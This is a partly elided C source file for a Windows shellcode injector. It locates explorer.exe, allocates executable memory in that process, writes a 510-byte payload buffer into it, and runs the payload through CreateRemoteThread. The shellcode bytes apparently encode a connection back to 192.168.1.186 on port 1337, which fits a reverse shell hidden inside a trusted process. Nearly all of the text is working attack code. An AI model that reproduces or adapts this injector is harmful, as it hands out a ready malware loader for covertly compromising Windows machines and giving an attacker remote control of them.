...
"\x40\x20\x8b\x48\x18\x49\x01\xd0\x50\xe3\x56\x48\xff\xc9\x41"
...
"\x49\xbc\x02\x00\x05\x39\xc0\xa8\x01\xba\x41\x54\x49\x89\xe4"
...
unsigned int payloadSize = 510;



int findProcID(const char* procName) {

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Creates list of running processes

	// Strings conversion
	size_t unused;
	wchar_t winProcName[260];
	mbstowcs_s(&unused, winProcName, procName, strlen(procName));
	...
	// iterate over next process
	while (Process32Next(snap, &proc)) {
		if (wcscmp(proc.szExeFile, winProcName)==0) { //match found!
...
void main() {
	// Find process to inject into (ID)
	int procID = findProcID("explorer.exe");
	// INJECT!
	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ, FALSE, (DWORD)procID);
	LPVOID procPtr = VirtualAllocEx(process, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);

	SIZE_T written;
	WriteProcessMemory(process, procPtr, (PVOID)buf, (SIZE_T)payloadSize, &written);
	HANDLE remThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)procPtr, NULL, NULL, NULL);

	// Wait for session to end before closing
	WaitForSingleObject(remThread, -1);
}